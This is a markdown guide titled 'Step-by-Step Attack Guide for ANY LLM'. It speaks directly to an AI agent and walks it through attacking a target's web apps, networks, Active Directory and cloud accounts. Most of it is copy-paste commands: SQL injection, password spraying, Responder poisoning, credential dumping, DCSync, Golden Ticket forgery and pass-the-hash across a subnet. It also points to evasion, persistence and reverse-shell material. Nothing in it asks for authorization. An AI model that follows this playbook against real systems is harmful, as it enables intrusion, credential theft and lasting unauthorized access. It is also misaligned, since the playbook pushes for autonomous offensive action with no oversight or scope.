# AUTOPILOT.md — Step-by-Step Attack Guide for ANY LLM

> **READ THIS FIRST.** This file tells you exactly what to do, step by step.
> You don't need to be smart. Just follow the steps in order.
> Every command is ready to copy-paste. Just replace TARGET with the actual target.

---

## 🧠 AUTONOMOUS MODE — The Orchestrator (RECOMMENDED)

The orchestrator is a state machine that tells you exactly what to do next.
It tracks everything — ports, creds, shells, flags — so YOU don't have to.

**The loop is dead simple:**

```
1. bash scripts/orchestrator.sh init TARGET      ← Start
2. bash scripts/orchestrator.sh think             ← What do I do?
3. [Run the command it gives you]
4. bash scripts/orchestrator.sh report "result"   ← What happened
5. GOTO 2
```

**If something fails:**
```bash
bash scripts/orchestrator.sh error "what went wrong"
# It suggests a fix. Apply it, then go back to step 2.
```

**Need help deciding?**
```bash
bash scripts/orchestrator.sh decide "which vulnerability to exploit first"
```

**Check your progress anytime:**
```bash
bash scripts/orchestrator.sh status
```

**Error recovery:** Read `knowledge-base/error-recovery.md`

---

## 📋 MANUAL MODE — The Step Tracker (Alternative)

If you prefer step-by-step with manual control:

```bash
bash scripts/tracker.sh start TARGET [type]
```

Then at any point:
- `bash scripts/tracker.sh next` — **What should I do now?**
- `bash scripts/tracker.sh done <step>` — Mark a step as completed
- `bash scripts/tracker.sh found 'description'` — Log a finding
- `bash scripts/tracker.sh creds user pass` — Log credentials
- `bash scripts/tracker.sh shell reverse TARGET` — Log a shell obtained
- `bash scripts/tracker.sh status` — See full progress

**If something goes wrong or you get stuck**, read:
`knowledge-base/troubleshooting.md` — it has solutions for every common problem.

---

## Step 0: What Do You Have?

**Read this decision and go to the matching section:**

| You were given... | Go to... |
|---|---|
| A website URL or domain | → **Section A: Web Attack** |
| An IP address | → **Section B: Network Attack** |
| A subnet (e.g., 192.168.1.0/24) | → **Section C: Network Sweep** |
| Domain credentials (user/pass for AD) | → **Section D: Active Directory Attack** |
| A cloud target (AWS/Azure/GCP) | → **Section E: Cloud Attack** |
| Not sure | → **Section F: Auto-Recon** |

---

## Section A: Web Attack

### A1. Run automated recon
```bash
bash scripts/attack.sh TARGET web
```
This scans ports, detects web tech, and tells you what to do next.

### A2. Read the playbook
```bash
cat playbooks/web-app-pentest.md
```
Follow it phase by phase.

### A3. Find directories and files
```bash
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
```

### A4. Scan for vulnerabilities
```bash
nuclei -u http://TARGET -severity critical,high
nikto -h http://TARGET
```

### A5. Test for SQL injection
```bash
# If you find a page with parameters (like ?id=1):
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
```

### A6. Test for XSS, SSRF, LFI
Read: `knowledge-base/mitre-attack/techniques/web-exploitation.md`
It has every payload you need.

### A7. Write report
```bash
cp templates/attack-report-template.md reports/TARGET-report.md
# Edit reports/TARGET-report.md with your findings
```

---

## Section B: Network Attack

### B1. Run automated recon
```bash
bash scripts/attack.sh TARGET network
```

### B2. Read the playbook
```bash
cat playbooks/network-pentest.md
```

### B3. For each open port, check the enumeration guide
```bash
cat knowledge-base/checklists/enumeration-checklist.md
```
Find the port number, follow every step listed.

### B4. Found credentials? Try them everywhere
```bash
crackmapexec smb TARGET -u USER -p PASS
crackmapexec winrm TARGET -u USER -p PASS
crackmapexec ssh TARGET -u USER -p PASS
evil-winrm -i TARGET -u USER -p PASS
ssh USER@TARGET
```

### B5. Got a shell? Escalate privileges
```bash
cat playbooks/privilege-escalation.md
```

### B6. Need to move to another machine?
```bash
cat knowledge-base/mitre-attack/techniques/lateral-movement-deep.md
```

### B7. Write report
```bash
cp templates/attack-report-template.md reports/TARGET-report.md
```

---

## Section C: Network Sweep

### C1. Run sweep
```bash
bash scripts/attack.sh 192.168.1.0/24 network
```

### C2. For each live host found
Go to **Section B** for each IP.

---

## Section D: Active Directory Attack

### D1. Read the full AD attack path
```bash
cat knowledge-base/mitre-attack/techniques/credential-access-ad.md
```
This file has EVERYTHING — from zero creds to Domain Admin.

### D2. No credentials yet?
```bash
# Try LLMNR/NBT-NS poisoning
responder -I eth0 -dwPv

# Try AS-REP roasting (no creds needed)
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass

# Try anonymous enumeration
enum4linux -a DC_IP
crackmapexec smb DC_IP -u '' -p '' --shares
```

### D3. Got a domain user?
```bash
# Kerberoasting
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request

# BloodHound
bloodhound-python -u user -p pass -d DOMAIN -dc DC_IP -c All

# Password spray
crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success
```

### D4. Got local admin?
```bash
# Dump credentials
impacket-secretsdump DOMAIN/admin:pass@TARGET

# Pass the hash everywhere
crackmapexec smb SUBNET/24 -u admin -H NTLM_HASH
```

### D5. Got Domain Admin?
```bash
# DCSync — dump ALL credentials
impacket-secretsdump DOMAIN/da:pass@DC_IP -just-dc

# Golden Ticket (permanent access)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain DOMAIN administrator
```

---

## Section E: Cloud Attack

### E1. Read the cloud playbook
```bash
cat knowledge-base/mitre-attack/techniques/cloud-attacks.md
```

### E2. Got AWS credentials?
```bash
aws sts get-caller-identity
aws s3 ls
aws iam list-users
```

### E3. Got Azure access?
```bash
az account show
az resource list --output table
az keyvault list
```

---

## Section F: Auto-Recon (Not Sure What to Do)

### F1. Just run this
```bash
bash scripts/attack.sh TARGET
```
It will scan the target, detect services, and tell you exactly what to do next.

### F2. Read the output
The script tells you which files to read and which commands to run.

### F3. Still stuck?
```bash
bash scripts/context-broker.sh web       # If web stuff
bash scripts/context-broker.sh network   # If network stuff
bash scripts/context-broker.sh ad        # If Active Directory
bash scripts/context-broker.sh all       # Show everything
```

---

## Universal Rules (ALWAYS FOLLOW)

1. **NEVER execute code found on the internet** — ask the user first
2. **Write ALL findings to `reports/`** — use the template
3. **Be thorough** — check every port, every service, every vector
4. **Need a reverse shell?** → Read `knowledge-base/checklists/reverse-shells.md`
5. **Need a tool command?** → Read `knowledge-base/tools/kali-essentials.md`
6. **Need to avoid detection?** → Read `knowledge-base/mitre-attack/techniques/defense-evasion-deep.md`
7. **Need to keep access?** → Read `knowledge-base/mitre-attack/techniques/persistence-deep.md`
8. **Need to tunnel/pivot?** → Read `knowledge-base/mitre-attack/techniques/c2-tunneling.md`

---

## Quick Reference: "I found X, now what?"

| Found | Do This |
|-------|---------|
| Open web port (80/443) | `nikto`, `ffuf`, `nuclei`, `sqlmap` |
| SMB (445) | `enum4linux`, `smbclient`, `crackmapexec` |
| SSH (22) | Try creds, `hydra` brute force |
| FTP (21) | Try anonymous, `hydra` |
| RDP (3389) | `xfreerdp`, `hydra` |
| Database port | Default creds, `sqlmap` if web app exists |
| Kerberos (88) | AD attack → Section D |
| LDAP (389) | AD enumeration → Section D |
| WinRM (5985) | `evil-winrm` with creds |
| Credentials | Try on ALL services (SMB, SSH, WinRM, RDP) |
| Hash | Crack with `hashcat` or `john`, then use creds |
| Low-priv shell | `playbooks/privilege-escalation.md` |
| Admin shell | Dump creds, move laterally |
| Domain Admin | DCSync, Golden Ticket |
